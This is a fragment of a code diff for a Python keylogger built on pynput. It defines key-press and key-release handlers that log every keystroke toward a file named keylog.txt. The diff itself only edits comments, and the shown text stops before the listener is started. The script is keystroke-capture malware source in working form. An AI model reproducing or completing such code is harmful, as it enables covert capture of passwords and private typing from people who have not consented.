@@ -1,13 +1,14 @@
 import logging
 from pynput.keyboard import Key, Listener
 
+#storing Logs
 log_file = "keylog.txt"
 
 def on_press(key):
     try:
         logging.info(str(key))
     except AttributeError:
-        # If special key is pressed (e.g., Shift), ignore it
+        # If special key is pressed (ex: Shift), ignore it
         pass
 
 def on_release(key):
